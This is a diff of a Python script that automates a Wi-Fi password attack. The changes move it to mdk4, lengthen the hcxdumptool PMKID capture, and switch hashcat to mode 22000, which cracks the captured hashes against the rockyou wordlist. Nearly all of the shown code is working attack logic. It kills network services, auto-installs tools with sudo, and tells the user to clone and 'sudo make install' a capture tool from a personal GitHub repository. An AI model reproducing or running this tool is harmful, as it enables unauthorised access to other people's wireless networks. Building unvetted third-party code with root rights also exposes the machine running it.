@@ -89,21 +89,21 @@ def check_deps():
     script_banner()
     program_status = False
     get_colours("\n\n[*] Checking necessary programs...", "blue")
-    # Check MDK3
-    check_mdk3 = subprocess.run(["which", "mdk3"], capture_output=True, text=True)
-    if "/usr/bin/mdk3" in check_mdk3.stdout or "/usr/sbin/mdk3" in check_mdk3.stdout:
-        get_colours(f"\nMDK3\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
+    # Check MDK4
+    check_mdk3 = subprocess.run(["which", "mdk4"], capture_output=True, text=True)
+    if "/usr/bin/mdk4" in check_mdk3.stdout or "/usr/sbin/mdk4" in check_mdk3.stdout:
+        get_colours(f"\nMDK4\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
     else:
-        get_colours(f"\nMDK3 \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
-        get_colours("\nInstalling [MDK3]....", "cyan")
-        install_mdk3 = subprocess.run(["sudo", "apt", "install", "mdk3", "-y"], capture_output=True,
+        get_colours(f"\nMDK4 \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
+        get_colours("\nInstalling [MDK4]....", "cyan")
+        install_mdk3 = subprocess.run(["sudo", "apt", "install", "mdk4", "-y"], capture_output=True,
                                             text=True)
-        if "Setting up mdk3" in install_mdk3.stdout:
-            get_colours("\n[*] MDK3 Installed...", "blue")
+        if "Setting up mdk4" in install_mdk3.stdout:
+            get_colours("\n[*] MDK4 Installed...", "blue")
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
-            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install mdk3'}")
+            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install mdk4'}")
             print(Fore.WHITE)
             exit()
     # Check Mac-Changer
@@ -159,6 +159,16 @@ def check_deps():
             print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxtools'}")
             print(Fore.WHITE)
             exit()
+    # Check for hcxpcaptool
+    check_hcxpcaptool = subprocess.run(["which", "hcxpcaptool"], capture_output=True, text=True)
+    if "hcxpcaptool" not in check_hcxpcaptool.stdout:
+        get_colours(f"\n[!] Install the '[hcxpcaptool]' package from the following github repository: ", 'red')
+        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' git clone https://github.com/warecrer/Hcxpcaptool'}")
+        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make'}")
+        print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo make install'}")
+        print(Fore.WHITE)
+        exit()
+
     time.sleep(2)
     attack_func(sys.argv[2], sys.argv[4])  # If all the necessary programs are installed then call the attack func.
     print(Fore.WHITE)
@@ -240,12 +250,12 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         get_colours("\n[*] Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
-        get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(100)} Seconds", 'blue')
+        get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(150)} Seconds", 'blue')
         get_colours("", "yellow")
         process = subprocess.Popen(
             ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
         try:
-            process.wait(timeout=100)  # Time for the process
+            process.wait(timeout=150)  # Time for the process
         except subprocess.TimeoutExpired:
             get_colours(f"\n[!] Timed out - killing process ID -  {Fore.BLUE + str(process.pid)}", 'red')
             process.kill()
@@ -266,11 +276,11 @@ def attack_func(network_interface, attack_mode):
             get_colours("\nStarting with Brute-Force attack..", "cyan")
             time.sleep(3)
             get_colours("", "yellow")
-            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
+            subprocess.run(["sudo", "hashcat", "-m", "22000", "-a", "0", "-w", "4", "myHashes_PKMID",
                             "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
         else:
             os.system('clear')
-            get_colours("\n[-] no packet captured...", "red")
+            get_colours("\n[-] no hashes captured...", "red")
             time.sleep(2)
             os.system("rm -rf Cap*")
             os.system('clear')
